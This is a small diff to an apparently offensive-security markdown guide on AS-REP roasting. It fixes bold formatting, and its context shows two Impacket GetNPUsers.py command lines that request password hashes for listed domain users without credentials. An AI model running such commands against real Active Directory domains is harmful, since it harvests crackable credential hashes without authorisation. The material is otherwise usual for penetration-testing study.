@@ -14,7 +14,7 @@ AS-REP roasting is a technique that allows retrieving password hashes for users 
 ````bash
 while read p; do GetNPUsers.py <domain>/"$p" -request -no-pass -dc-ip <DC-IP> >> hash.txt; done < usernames.txt | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN' usernames.txt
 ````
-**Impacket builtin loop*
+**Impacket builtin loop**
 ````bash
 GetNPUsers.py <domain>/ -no-pass -usersfile <username.txt> -dc-ip
 <DC-IP> | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
